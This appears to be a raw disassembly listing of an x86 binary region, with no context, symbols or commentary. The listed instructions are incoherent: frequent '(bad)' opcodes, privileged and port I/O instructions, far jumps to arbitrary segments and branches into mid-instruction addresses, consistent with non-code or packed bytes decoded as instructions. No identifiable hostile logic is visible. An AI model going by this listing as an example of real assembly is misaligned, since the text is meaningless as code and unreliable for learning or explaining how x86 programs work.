  41ed28:	adc    eax,0x6894f8d7
  41ed2d:	dec    ebp
  41ed2e:	pmulhw mm7,QWORD PTR [edi+0x6b448611]
  41ed35:	jne    0x41eccd
  41ed37:	not    BYTE PTR [ecx]
  41ed39:	enter  0x5f0f,0xc4
  41ed3d:	sub    bl,dh
  41ed3f:	clc    
  41ed40:	rcr    BYTE PTR [edi+0x17],cl
  41ed43:	xlat   BYTE PTR ds:[ebx]
  41ed44:	ins    BYTE PTR es:[edi],dx
  41ed45:	push   0xb7545107
  41ed4a:	imul   esi,DWORD PTR [edx-0x5fbc2e10],0xbab10593
  41ed54:	adc    eax,0x4a2306b5
  41ed59:	or     DWORD PTR [ecx-0x57],0x58
  41ed5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed5e:	iret   
  41ed5f:	fadd   st,st(3)
  41ed61:	dec    esp
  41ed62:	jge    0x41edc8
  41ed64:	iret   
  41ed65:	jno    0x41ed7c
  41ed67:	mov    ds:0x8904dbf1,eax
  41ed6c:	loope  0x41edb6
  41ed6e:	(bad)  
  41ed6f:	imul   ebp,edi,0x4b
  41ed72:	jge    0x41ede6
  41ed74:	stos   BYTE PTR es:[edi],al
  41ed75:	xor    eax,0x213b1e28
  41ed7a:	inc    ecx
  41ed7b:	jb     0x41ed2d
  41ed7d:	icebp  
  41ed7e:	mov    eax,0x28a9b8e
  41ed83:	ja     0x41ede0
  41ed85:	inc    esp
  41ed86:	jns    0x41ede4
  41ed88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed89:	ror    DWORD PTR [eax+0x2],cl
  41ed8c:	fs or  al,bh
  41ed8f:	nop
  41ed90:	aas    
  41ed91:	jns    0x41ed29
  41ed93:	js     0x41edc4
  41ed95:	jp     0x41ee08
  41ed97:	(bad)  
  41ed98:	adc    DWORD PTR [edx-0x2c],ebp
  41ed9b:	or     BYTE PTR [edx+0x53],dl
  41ed9e:	jmp    0x3ff7601c
  41eda3:	lock shr DWORD PTR [ebx],1
  41eda6:	xor    al,0x2c
  41eda8:	int    0xa5
  41edaa:	arpl   WORD PTR [ecx-0x571383c1],ax
  41edb0:	mov    edi,0x9335721b
  41edb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb6:	pop    esp
  41edb7:	mov    edi,0x8159b271
  41edbc:	test   BYTE PTR [ecx+0x7f],bl
  41edbf:	fwait
  41edc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edc1:	sar    DWORD PTR [eax],0xdd
  41edc4:	sub    edx,DWORD PTR [ebx-0x2da77931]
  41edca:	call   0xf22b:0x44144b3f
  41edd1:	mov    bh,0xf2
  41edd3:	(bad)  
  41edd4:	sub    ecx,esi
  41edd6:	and    bl,BYTE PTR [edi+esi*8-0x71a60fba]
  41eddd:	repnz pop esp
  41eddf:	out    0x75,eax
  41ede1:	cmp    al,0x63
  41ede3:	xchg   ebp,eax
  41ede4:	jne    0x41ed84
  41ede6:	mov    esi,0x7312164d
  41edeb:	fwait
  41edec:	test   eax,0xe3fcc077
  41edf1:	int    0xb9
  41edf3:	scas   al,BYTE PTR es:[edi]
  41edf4:	push   esi
  41edf5:	mov    ch,0x5d
  41edf7:	mov    dh,0x97
  41edf9:	clc    
  41edfa:	mov    bl,0xcb
  41edfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edfd:	mov    ds:0xbb42f0f3,eax
  41ee02:	jns    0x41edad
  41ee04:	mov    al,0xe2
  41ee06:	fdivr  st(6),st
  41ee08:	sub    ah,0xf9
  41ee0b:	adc    DWORD PTR es:[eax+0x12],ecx
  41ee0f:	jbe    0x41edbc
  41ee11:	test   edx,ebp
  41ee13:	hlt    
  41ee14:	imul   edx,DWORD PTR [edx-0x19],0xffffff8e
  41ee18:	pop    esi
  41ee19:	repz icebp 
  41ee1b:	inc    ecx
  41ee1c:	inc    eax
  41ee1d:	mov    cl,0xbd
  41ee1f:	mov    edx,0xf43e2a74
  41ee24:	jnp    0x41ee70
  41ee26:	ins    BYTE PTR es:[edi],dx
  41ee27:	call   FWORD PTR [esi]
  41ee29:	push   esp
  41ee2a:	loop   0x41edcc
  41ee2c:	in     eax,0x2e
  41ee2e:	xlat   BYTE PTR ds:[ebx]
  41ee2f:	xchg   ecx,eax
  41ee30:	sub    BYTE PTR [eax],ch
  41ee32:	ins    BYTE PTR es:[edi],dx
  41ee33:	inc    edx
  41ee34:	mov    ch,0x3d
  41ee36:	or     ecx,DWORD PTR [esi-0x4e]
  41ee39:	das    
  41ee3a:	sub    al,0x1a
  41ee3c:	cdq    
  41ee3d:	and    ch,BYTE PTR [edx]
  41ee3f:	inc    ebx
  41ee40:	jle    0x41ee40
  41ee42:	fisttp QWORD PTR [eax+0x78]
  41ee45:	cmc    
  41ee46:	sti    
  41ee47:	mov    ecx,0x64b25f66
  41ee4c:	call   0xbcb3c70a
  41ee51:	push   esp
  41ee52:	fbstp  TBYTE PTR [esi]
  41ee54:	xchg   ecx,esi
  41ee56:	rol    BYTE PTR [edi+eax*4-0x21],1
  41ee5a:	mov    cl,0x6d
  41ee5c:	dec    ebp
  41ee5d:	sbb    ebx,DWORD PTR [ecx]
  41ee5f:	add    BYTE PTR [edx-0x27],dl
  41ee62:	daa    
  41ee63:	mov    bh,0xa4
  41ee65:	xchg   ebp,eax
  41ee66:	push   esi
  41ee67:	pusha  
  41ee68:	or     edi,esi
  41ee6a:	icebp  
  41ee6b:	or     al,0xf8
  41ee6d:	jne    0x41edf6
  41ee6f:	fcos   
  41ee71:	jmp    0x3ed6616d
  41ee76:	adc    DWORD PTR [ebp+0x63],eax
  41ee79:	test   BYTE PTR [esi],ah
  41ee7b:	mov    ch,0xcb
  41ee7d:	xor    DWORD PTR [edx-0x66],esi
  41ee80:	mov    ds:0x6589c2e0,al
  41ee85:	pop    ebx
  41ee86:	sub    al,0x69
  41ee88:	adc    cl,BYTE PTR [eax-0x634c1058]
  41ee8e:	ins    DWORD PTR es:[edi],dx
  41ee8f:	mov    ch,0xe0
  41ee91:	mov    ah,BYTE PTR [edx+0x63257831]
  41ee97:	mov    ds:0xa9947244,eax
  41ee9c:	sub    DWORD PTR ds:0x308cf7ed,0x8c0311df
  41eea6:	mov    bl,0xe6
  41eea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eea9:	jmp    0xd463:0x98db307e
  41eeb0:	jmp    0xea9b:0x747f20b8
  41eeb7:	ret    
  41eeb8:	std    
  41eeb9:	stos   DWORD PTR es:[edi],eax
  41eeba:	sub    al,ch
  41eebc:	mov    edi,0x4191ad24
  41eec1:	mul    DWORD PTR [ecx-0x4a]
  41eec4:	mov    ch,BYTE PTR [ebx+0x778b76e8]
  41eeca:	adc    BYTE PTR [eax-0x7773d3e9],cl
  41eed0:	adc    DWORD PTR [esi+eiz*8-0xe],ebp
  41eed4:	jge    0x41ee88
  41eed6:	jmp    0x2b:0x12b020dd
  41eedd:	xor    DWORD PTR [esi+0x47],edi
  41eee0:	dec    edx
  41eee1:	popa   
  41eee2:	lds    ebx,FWORD PTR [edx]
  41eee4:	ss jae 0x41ee77
  41eee7:	dec    esi
  41eee8:	dec    esp
  41eee9:	iret   
  41eeea:	outs   dx,BYTE PTR ds:[esi]
  41eeeb:	inc    edi
  41eeec:	into   
  41eeed:	cmc    
  41eeee:	ficom  DWORD PTR [eax+esi*8-0x28]
  41eef2:	hlt    
  41eef3:	mov    edi,DWORD PTR [ebx-0x46834efd]
  41eef9:	jbe    0x41ee7f
  41eefb:	cmp    BYTE PTR fs:[ebx-0x49],cl
  41eeff:	add    dh,cl
  41ef01:	ds aad 0x61
  41ef04:	into   
  41ef05:	(bad)  
  41ef06:	je     0x41eec5
  41ef08:	shr    DWORD PTR [esi-0x4f],cl
  41ef0b:	fcomip st,st(0)
  41ef0d:	ret    0x688b
  41ef10:	lods   al,BYTE PTR ds:[esi]
  41ef11:	add    BYTE PTR [eax+0x65d0fff0],al
  41ef17:	inc    edx
  41ef18:	dec    edi
  41ef19:	in     eax,0xad
  41ef1b:	ror    DWORD PTR ds:0x321674c2,cl
  41ef21:	cmp    ecx,DWORD PTR [eax]
  41ef23:	pop    edi
  41ef24:	les    ebp,FWORD PTR [edi]
  41ef26:	loope  0x41eecf
  41ef28:	inc    ebp
  41ef29:	or     al,0xbc
  41ef2b:	or     edi,eax
  41ef2d:	sbb    eax,0x4d8357ca
  41ef32:	mov    esi,0x3d7e740d
  41ef37:	sub    DWORD PTR [ebx*4-0x1f0592d1],0xcc16e410
  41ef42:	pusha  
  41ef43:	jle    0x41efa1
  41ef45:	fstp   DWORD PTR [eax]
  41ef47:	(bad)  
  41ef48:	and    DWORD PTR [edx+edi*1],ecx
  41ef4b:	inc    esp
  41ef4c:	(bad)  
  41ef4d:	in     eax,0x93
  41ef4f:	(bad)  
  41ef50:	sub    BYTE PTR [esi+0x4237b439],al
  41ef56:	jo     0x41ef1d
  41ef58:	je     0x41ef40
  41ef5a:	(bad)  
  41ef5b:	mov    eax,ds:0xe7064dfb
  41ef60:	loope  0x41efdf
  41ef62:	fidiv  WORD PTR [ebp+0x38]
  41ef65:	add    BYTE PTR [ebx],ch
  41ef67:	mov    bl,dl
  41ef69:	adc    DWORD PTR [ebx+ebx*2],edx
  41ef6c:	retf   0x70f5
  41ef6f:	adc    BYTE PTR [esi+0x4323305],dh
  41ef75:	test   al,0xcd
  41ef77:	lods   al,BYTE PTR ds:[esi]
  41ef78:	add    al,0xe9
  41ef7a:	in     eax,0xa
  41ef7c:	inc    ebp
  41ef7d:	adc    bl,BYTE PTR [ecx+0x1d48d465]
  41ef83:	sbb    esp,DWORD PTR [ecx]
  41ef85:	push   0x6f
  41ef87:	(bad)  
  41ef88:	das    
  41ef89:	ret    
  41ef8a:	jne    0x41efca
  41ef8c:	int    0x7a
  41ef8e:	clc    
  41ef8f:	shl    DWORD PTR [edx+eax*4-0x73],1
  41ef93:	mov    ecx,ebp
  41ef95:	repnz test al,0x78
  41ef98:	jb     0x41ef80
  41ef9a:	add    dl,ch
  41ef9c:	pusha  
  41ef9d:	mov    bh,0x42
  41ef9f:	(bad)  
  41efa0:	mov    cl,0x19
  41efa2:	adc    eax,esi
  41efa4:	cwde   
  41efa5:	xchg   esi,eax
  41efa6:	fisub  DWORD PTR [ebx+0x7d43c44e]
  41efac:	shl    DWORD PTR [ebp+0x69b44a25],1
  41efb2:	(bad)  
  41efb3:	sub    al,0x70
  41efb5:	outs   dx,DWORD PTR ds:[esi]
  41efb6:	pop    ecx
  41efb7:	cmp    eax,0xe9ea4318
  41efbc:	add    bl,al
  41efbe:	inc    ebx
  41efbf:	outs   dx,BYTE PTR ds:[esi]
  41efc0:	and    BYTE PTR [ebp+eiz*2+0x616b523c],0x28
  41efc8:	outs   dx,DWORD PTR ds:[esi]
  41efc9:	ins    DWORD PTR es:[edi],dx
  41efca:	nop
  41efcb:	fild   DWORD PTR [ecx+edx*8-0x34734080]
  41efd2:	ja     0x41f00d
  41efd4:	dec    esi
  41efd5:	ficom  DWORD PTR [edi+edi*4-0x893a4ee]
  41efdc:	(bad)  
  41efde:	fst    DWORD PTR [edi-0x26]
  41efe1:	mov    edx,0xbc2d84f8
  41efe6:	and    eax,0xad279ab3
  41efeb:	xchg   edx,eax
  41efec:	mov    esp,0x9d2655f7
  41eff1:	lods   al,BYTE PTR ds:[esi]
  41eff2:	xchg   DWORD PTR [ebx-0x69249fb9],esp
  41eff8:	out    dx,al
  41eff9:	out    dx,al
  41effa:	push   0xffffffb6
  41effc:	mov    al,ds:0xd5232a9b
  41f001:	mov    eax,0x7cc693db
  41f006:	jp     0x41efeb
  41f008:	inc    edx
  41f009:	pop    edx
  41f00a:	dec    edi
  41f00b:	mov    DWORD PTR [edx],eax
  41f00d:	mov    edi,0x8c8314ff
  41f012:	popa   
  41f013:	pushf  
  41f014:	out    dx,eax
  41f015:	cmp    DWORD PTR [esi],eax
  41f017:	fcmove st,st(6)
  41f019:	push   cs
  41f01a:	cmp    edx,DWORD PTR ss:[ecx]
  41f01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f01e:	sub    al,0xca
  41f020:	ins    BYTE PTR es:[edi],dx
  41f021:	inc    ecx
  41f022:	mov    ch,0x3a
  41f024:	test   edx,0x36a1e64f
  41f02a:	mov    eax,ds:0xd0250193
  41f02f:	dec    ebp
  41f030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f031:	clc    
  41f032:	in     eax,0xea
  41f034:	in     eax,dx
  41f035:	mov    bh,0x5e
  41f037:	ret    
  41f038:	mov    ebx,0x413bd6b
  41f03d:	fidiv  DWORD PTR [eax-0x3e]
  41f040:	test   BYTE PTR ds:0x358310e0,cl
  41f046:	and    DWORD PTR [ebp+0x41],esi
  41f049:	cmc    
  41f04a:	arpl   WORD PTR [edx],sp
  41f04c:	xchg   ebp,eax
  41f04d:	mov    DWORD PTR es:[edx],edx
  41f050:	aam    0xe2
  41f052:	repz das 
  41f054:	dec    esp
  41f055:	push   cs
  41f056:	aaa    
  41f057:	adc    ah,BYTE PTR ds:0x5282017f
  41f05d:	pop    ecx
  41f05e:	fsub   QWORD PTR [bx+si+0x33]
  41f062:	xor    DWORD PTR [edx+0x64f2b6a6],ebx
  41f068:	daa    
  41f069:	inc    ebp
  41f06a:	and    ch,BYTE PTR [ebx]
  41f06c:	xchg   ecx,eax
  41f06d:	aad    0x83
  41f06f:	mov    bl,0x19
  41f071:	js     0x41eff8
  41f073:	inc    edi
  41f074:	xchg   esp,eax
  41f075:	sti    
  41f076:	mov    edx,0x96499abf
  41f07b:	ja     0x41f04b
  41f07d:	cmp    al,BYTE PTR [esi+0x12148d27]
  41f083:	mov    ds:0x1012d9ee,eax
  41f088:	nop
  41f089:	sbb    eax,esi
  41f08b:	int    0x43
  41f08d:	ficomp DWORD PTR [esi+0x390e3acc]
  41f093:	jbe    0x41f08f
  41f095:	enter  0x42a7,0x56
  41f099:	outs   dx,BYTE PTR ds:[esi]
  41f09a:	xor    edx,ebx
  41f09c:	(bad)  
  41f09d:	xchg   ebp,eax
  41f09e:	xor    eax,0xa4f6ba5d
  41f0a3:	leave  
  41f0a4:	mov    ?,WORD PTR [edi+0x47]
  41f0a7:	jnp    0x41f0d4
  41f0a9:	sbb    eax,0x4bf310e4
  41f0ae:	mov    ecx,0x89aa0785
  41f0b3:	mov    al,0xec
  41f0b5:	push   esp
  41f0b6:	dec    edx
  41f0b7:	test   eax,0xaa580014
  41f0bc:	sub    bh,BYTE PTR [esi+eax*8]
  41f0bf:	jmp    0x41f103
  41f0c1:	nop
  41f0c2:	cmp    eax,0xc324758c
  41f0c7:	or     ch,BYTE PTR [edi+edx*1]
  41f0ca:	int    0xaa
  41f0cc:	popf   
  41f0cd:	and    al,0x9c
  41f0cf:	or     DWORD PTR ds:0xfeab5c7a,0x10
  41f0d6:	pop    edx
  41f0d7:	clc    
  41f0d8:	mov    bh,0xf5
  41f0da:	pop    ebx
  41f0db:	mov    bl,0x15
  41f0dd:	popa   
  41f0de:	xor    al,0x9f
  41f0e0:	inc    edi
  41f0e1:	fwait
  41f0e2:	push   ecx
  41f0e3:	fsubr  QWORD PTR ds:0x9badebe
  41f0e9:	sbb    DWORD PTR ds:0x486f1a45,ebx
  41f0ef:	ja     0x41f072
  41f0f1:	mov    dl,BYTE PTR [esi]
  41f0f3:	mov    al,ds:0xb02acd51
  41f0f8:	sahf   
  41f0f9:	or     eax,0xda6c5ab5
  41f0fe:	inc    ebx
  41f0ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f100:	mov    al,ds:0x48c303a
  41f105:	(bad)  
  41f106:	imul   ebx,DWORD PTR [edx-0x4361cd89],0xbda92df8
  41f110:	cmp    al,0xaa
  41f112:	mov    ds:0xe98d5d40,al
  41f117:	es add eax,ebp
  41f11a:	mov    WORD PTR [ebx],es
  41f11c:	addr16 int3 
  41f11e:	hlt    
  41f11f:	dec    edi
  41f120:	lods   al,BYTE PTR ds:[esi]
  41f121:	cli    
  41f122:	outs   dx,BYTE PTR ds:[esi]
  41f123:	xor    esi,DWORD PTR [eax]
  41f125:	push   ebp
  41f126:	shr    ebx,cl
  41f128:	mov    dl,0x2a
  41f12a:	add    DWORD PTR [edx+0x4f],0x872828ac
  41f131:	sub    dh,BYTE PTR [eax+edi*8+0x65b9d450]
  41f138:	icebp  
  41f139:	out    0x1b,al
  41f13b:	cld    
  41f13c:	ror    bh,0xd9
  41f13f:	mov    esi,0xb79a2111
  41f144:	pop    esi
  41f145:	and    al,0xa
  41f147:	mov    cs,WORD PTR [edi-0x72]
  41f14a:	jp     0x41f0dc
  41f14c:	or     eax,0x7580338e
  41f151:	mov    ebx,0xc9aa5a93
  41f156:	mov    ebp,0x49c87742
  41f15b:	mov    al,ds:0xcd021392
  41f160:	loopne 0x41f0f8
  41f162:	or     ecx,DWORD PTR [edx-0x6d]
  41f165:	sub    al,0x67
  41f167:	jno    0x41f1cc
  41f169:	popa   
  41f16a:	hlt    
  41f16b:	ja     0x41f1b0
  41f16d:	jne    0x41f1d3
  41f16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f170:	inc    edx
  41f171:	mov    edi,0x7382f46f
  41f176:	and    eax,0x39882302
  41f17b:	loopne 0x41f19c
  41f17d:	sbb    al,0xde
  41f17f:	aas    
  41f180:	outs   dx,DWORD PTR ds:[esi]
  41f181:	sbb    ebx,DWORD PTR [eax]
  41f183:	sahf   
  41f184:	leave  
  41f185:	mov    esp,0xb47a36b6
  41f18a:	cwde   
  41f18b:	pop    esp
  41f18c:	sbb    bl,cl
  41f18e:	movntq QWORD PTR [eax],mm6
  41f191:	jp     0x41f18c
  41f193:	dec    esp
  41f194:	popa   
  41f195:	ss and eax,0x10a4220
  41f19b:	popa   
  41f19c:	adc    eax,0xf82e15ec
  41f1a1:	pop    ebp
  41f1a2:	leave  
  41f1a3:	outs   dx,BYTE PTR fs:[esi]
  41f1a5:	add    eax,0xd0b3ea17
  41f1aa:	and    eax,0xa27e874d
  41f1af:	push   esp
  41f1b0:	dec    ebx
  41f1b1:	lods   al,BYTE PTR ds:[esi]
  41f1b2:	mov    ebp,0xcba71c17
  41f1b7:	pop    eax
  41f1b8:	dec    ecx
  41f1b9:	and    al,0x27
  41f1bb:	dec    edi
  41f1bc:	adc    al,0x3
  41f1be:	fsub   DWORD PTR [ecx-0x45]
  41f1c1:	add    eax,0x1d9062dd
  41f1c6:	dec    si
  41f1c8:	loope  0x41f1d6
  41f1ca:	bound  esi,QWORD PTR [esi]
  41f1cc:	push   edx
  41f1cd:	lea    ecx,[eax]
  41f1cf:	jne    0x41f160
  41f1d1:	lods   eax,DWORD PTR ds:[esi]
  41f1d2:	retf   
  41f1d3:	in     eax,0xe7
  41f1d5:	add    bl,BYTE PTR [edx-0x76]
  41f1d8:	jno    0x41f171
  41f1da:	jno    0x41f17f
  41f1dc:	push   cs
  41f1dd:	add    eax,0xac8095c1
  41f1e2:	jecxz  0x41f1a2
  41f1e4:	push   eax
  41f1e5:	and    ch,BYTE PTR [ebx]
  41f1e7:	loopne 0x41f1bb
  41f1e9:	ret    
  41f1ea:	repz call 0x9d99:0xd49b4f4
  41f1f2:	push   edx
  41f1f3:	popa   
  41f1f4:	(bad)  
  41f1f5:	dec    ebx
  41f1f6:	mov    ebx,0xdeec230
  41f1fb:	adc    al,0xae
  41f1fd:	ins    BYTE PTR es:[edi],dx
  41f1fe:	loop   0x41f1c9
  41f200:	cld    
  41f201:	push   ss
  41f202:	and    eax,edi
  41f204:	(bad)  [edi+0xd231d92]
  41f20a:	(bad)  
  41f20b:	clc    
  41f20c:	jmp    0x1b29bdd2
  41f211:	adc    dh,bh
  41f213:	dec    ebx
  41f214:	mov    WORD PTR [ecx-0x3f],?
  41f217:	push   esp
  41f218:	in     eax,dx
  41f219:	pop    esp
  41f21a:	jmp    0x6b0f:0x80d7eda2
  41f221:	add    dl,BYTE PTR [eax+0x7d]
  41f224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f225:	ins    BYTE PTR es:[edi],dx
  41f226:	imul   ebp,DWORD PTR [eax],0x33
  41f229:	(bad)  
  41f22a:	mov    ebx,0x912f0a40
  41f22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f230:	dec    edi
  41f231:	shl    DWORD PTR [ecx],cl
  41f233:	call   0x72d3678
  41f238:	popa   
  41f239:	(bad)  
  41f23a:	dec    edx
  41f23b:	call   0xb663e3cf
  41f240:	add    bh,cl
  41f242:	jmp    0xba0927a7
  41f247:	xor    BYTE PTR [ecx-0x24],ch
  41f24a:	and    DWORD PTR [bp+0x53],esp
  41f24e:	or     ch,ah
  41f250:	inc    ecx
  41f251:	push   eax
  41f252:	test   ebx,0x1bdf9e71
  41f258:	in     eax,dx
  41f259:	cdq    
  41f25a:	dec    BYTE PTR [ebx+esi*8-0x73]
  41f25e:	je     0x41f259
  41f260:	inc    ebx
  41f261:	mov    BYTE PTR [esi],0x6a
  41f264:	push   ecx
  41f265:	retf   
  41f266:	dec    ebp
  41f267:	or     al,0x55
  41f269:	cmp    ah,BYTE PTR [ecx+0x50]
  41f26c:	xlat   BYTE PTR ds:[ebx]
  41f26d:	mov    edx,0xe5d1b57
  41f272:	push   0xd2dcda9b
  41f277:	jbe    0x41f23a
  41f279:	out    dx,al
  41f27a:	mov    ss,WORD PTR [eax+ebx*1+0x339d2644]
  41f281:	inc    edx
  41f282:	push   cs
  41f283:	push   0x85a87184
  41f288:	scas   eax,DWORD PTR es:[edi]
  41f289:	sub    edi,DWORD PTR [edx+edi*4]
  41f28c:	mov    ds:0x5ac526dd,al
  41f291:	repnz xchg edi,eax
  41f293:	push   si
  41f295:	push   ss
  41f296:	pop    edx
  41f297:	mov    cl,0x75
  41f299:	in     al,dx
  41f29a:	add    bh,BYTE PTR [ebx-0x4c]
  41f29d:	xor    BYTE PTR [edi],ch
  41f29f:	leave  
  41f2a0:	call   FWORD PTR [edx+0x3a]
  41f2a3:	mov    ?,WORD PTR fs:[ecx-0x71]
  41f2a7:	jl     0x41f26c
  41f2a9:	jmp    0xa104:0xfa37a01e
  41f2b0:	(bad)  
  41f2b1:	in     eax,dx
  41f2b2:	mov    ds:0xad5edc7,al
  41f2b7:	adc    eax,0x8515f3d6
  41f2bc:	sbb    al,0xdc
  41f2be:	and    al,0x6a
  41f2c0:	enter  0x427,0x30
  41f2c4:	outs   dx,BYTE PTR ds:[esi]
  41f2c5:	push   edx
  41f2c6:	fadd   DWORD PTR [eax-0x694de1d7]
  41f2cc:	push   ebx
  41f2cd:	dec    ebp
  41f2ce:	cwde   
  41f2cf:	cmp    esp,esi
  41f2d1:	dec    ebp
  41f2d2:	mov    ebx,0xaf4a13eb
  41f2d7:	pop    ds
  41f2d8:	adc    al,0xe9
  41f2da:	xchg   BYTE PTR [eax],dh
  41f2dc:	and    eax,0x1b824875
  41f2e1:	call   0x483844
  41f2e6:	mov    esi,0xfb7fff19
  41f2eb:	add    DWORD PTR [esi-0x36b231d1],esi
  41f2f1:	cmc    
  41f2f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f3:	mov    ds,WORD PTR [edi-0x1c7ab6ac]
  41f2f9:	rcl    dh,0xf9
  41f2fc:	repnz fld TBYTE PTR [ebp+esi*2-0x573c5d9a]
  41f304:	sub    al,0x4a
  41f307:	push   cs
  41f308:	inc    edi
  41f309:	push   ebx
  41f30a:	ds cdq 
  41f30c:	pop    ds
  41f30d:	and    ch,cl
  41f30f:	mov    bl,dl
  41f311:	mov    ah,0xe8
  41f313:	(bad)
  41f317:	clc    
  41f318:	std    
  41f319:	out    0xdd,al
  41f31b:	int    0xe1
  41f31d:	or     BYTE PTR [eax+edx*1-0x32df72aa],bh
  41f324:	inc    edi
  41f325:	fcomp  DWORD PTR [eax+0x509623fb]
  41f32b:	gs into 
  41f32d:	dec    edx
  41f32e:	push   esp
  41f32f:	(bad)  
  41f330:	aam    0x63
  41f332:	or     eax,0x29480733
  41f337:	fwait
  41f338:	sbb    BYTE PTR [esi+0x3b],dh
  41f33b:	loope  0x41f32a
  41f33d:	xchg   esi,eax
  41f33e:	fadd   st(1),st
  41f340:	enter  0x1e20,0xa
  41f344:	pop    ds
  41f345:	ja     0x41f35d
  41f347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f348:	ret    
  41f349:	test   DWORD PTR [bp+si-0xa5],eax
  41f34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f34f:	call   0x6858f665
  41f354:	pushf  
  41f355:	mov    ds:0xe1ee67a8,eax
  41f35a:	mov    esp,0x48515e0d
  41f35f:	pop    ebp
  41f360:	mov    ebp,0x521bd187
  41f365:	test   al,0x28
  41f367:	push   edi
  41f368:	fwait
  41f369:	cli    
  41f36a:	ja     0x41f385
  41f36c:	jns    0x41f373
  41f36e:	cmp    bh,ch
  41f370:	jb     0x41f3d6
  41f372:	in     eax,0xc6
  41f374:	(bad)  
  41f375:	popf   
  41f376:	outs   dx,BYTE PTR ds:[esi]
  41f377:	mov    dl,ah
  41f379:	addr16 (bad) 
  41f37b:	pushf  
  41f37c:	jmp    0x99d810a2
  41f381:	neg    BYTE PTR [ebx+0x4b]
  41f384:	ins    DWORD PTR es:[edi],dx
  41f385:	sub    BYTE PTR [ebx+edi*2+0x51eed7bc],cl
  41f38c:	jb     0x41f3f4
  41f38e:	fld    TBYTE PTR [edi]
  41f390:	loopne 0x41f40d
  41f392:	pop    ebx
  41f393:	xchg   DWORD PTR [eax-0x592c8f06],esi
  41f399:	bound  ebx,QWORD PTR [ecx+ebp*4-0x33]
  41f39d:	out    dx,al
  41f39e:	sbb    eax,0x4786c250
  41f3a3:	xlat   BYTE PTR ds:[ebx]
  41f3a4:	adc    DWORD PTR [edi],esi
  41f3a6:	push   es
  41f3a7:	aad    0xdf
  41f3a9:	stos   BYTE PTR es:[edi],al
  41f3aa:	rol    DWORD PTR [ebp+0x521af9e0],0x6b
  41f3b1:	hlt    
  41f3b2:	out    0x4b,al
  41f3b4:	push   ebx
  41f3b5:	stos   BYTE PTR es:[edi],al
  41f3b6:	js     0x41f3c0
  41f3b8:	xor    eax,0x5a476ba2
  41f3bd:	aaa    
  41f3be:	je     0x41f36a
  41f3c0:	pop    edi
  41f3c1:	ret    
  41f3c2:	stos   BYTE PTR es:[edi],al
  41f3c3:	pusha  
  41f3c4:	outs   dx,DWORD PTR ds:[esi]
  41f3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3c6:	mov    ebx,0xa18b6759
  41f3cb:	mov    dh,0x64
  41f3cd:	mov    ss,WORD PTR [edi-0x59991448]
  41f3d3:	loopne 0x41f3da
  41f3d5:	leavew 
  41f3d7:	scas   eax,DWORD PTR es:[edi]
  41f3d8:	mov    edx,0xdd047a41
  41f3dd:	pop    ebp
  41f3de:	in     eax,dx
  41f3df:	popf   
  41f3e0:	mov    ecx,ebp
  41f3e2:	pop    ecx
  41f3e3:	sub    eax,0x9e26a60
  41f3e8:	fwait
  41f3e9:	test   DWORD PTR ds:0xce31bf80,0xdb27df98
  41f3f3:	push   eax
  41f3f4:	loope  0x41f3d3
  41f3f6:	out    0xac,al
  41f3f8:	inc    esp
  41f3f9:	mov    ebx,0x34ea6742
  41f3fe:	and    BYTE PTR [esi-0x5a],0xd8
  41f402:	sahf   
  41f403:	seta   BYTE PTR [ecx+0x3e]
  41f407:	fstp   QWORD PTR [ecx-0x44aa321d]
  41f40d:	mov    cl,0x7a
  41f40f:	pop    ds
  41f410:	push   ebx
  41f411:	push   ebp
  41f412:	sub    ecx,esi
  41f414:	enter  0x821c,0xe
  41f418:	int    0x85
  41f41a:	mov    cl,0x49
  41f41c:	xchg   ebx,eax
  41f41d:	jmp    0x8874:0xf159009f
  41f424:	(bad)  
  41f425:	lds    edi,FWORD PTR [eax]
  41f427:	iret   
  41f428:	sub    ecx,edi
  41f42a:	jmp    0x41f3c0
  41f42c:	fs in  eax,0x2c
  41f42f:	add    al,0xda
  41f431:	test   eax,0xf1ae71b4
  41f436:	nop
  41f437:	jo     0x41f415
  41f439:	in     eax,dx
  41f43a:	dec    edi
  41f43b:	imul   eax,edi,0xffffffa6
  41f43e:	outs   dx,BYTE PTR ds:[esi]
  41f43f:	add    al,0xe
  41f441:	add    eax,0xc0d4c42d
  41f446:	push   es
  41f447:	shl    DWORD PTR [edi],cl
  41f449:	int    0x49
  41f44b:	sahf   
  41f44c:	lds    esi,FWORD PTR [ecx+edi*2-0x40]
  41f450:	mov    bl,0xd1
  41f452:	mov    dl,BYTE PTR [edi-0x9f7e021]
  41f458:	pop    esi
  41f459:	ret    0x8604
  41f45c:	js     0x41f489
  41f45e:	sub    eax,0x274e4226
  41f463:	setbe  BYTE PTR [eax]
  41f466:	pushf  
  41f467:	dec    ebp
  41f468:	test   al,0x1e
  41f46a:	imul   ebx,esp,0xffffffd2
  41f46d:	call   FWORD PTR [eax]
  41f46f:	or     eax,0xa0dde00e
  41f474:	sub    eax,DWORD PTR [eax+0x5f51ae0a]
  41f47a:	or     bl,BYTE PTR [edi-0x34]
  41f47d:	lea    edx,[esi]
  41f47f:	popf   
  41f480:	cld    
  41f481:	pop    edx
  41f482:	xchg   esi,eax
  41f483:	xor    al,0x7c
  41f485:	dec    ebp
  41f486:	push   ds
  41f487:	addr16 into 
  41f489:	jo     0x41f4de
  41f48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f48c:	(bad)  
  41f48d:	aad    0x74
  41f48f:	aas    
  41f490:	and    dl,BYTE PTR [edi+esi*1]
  41f493:	popa   
  41f494:	push   ss
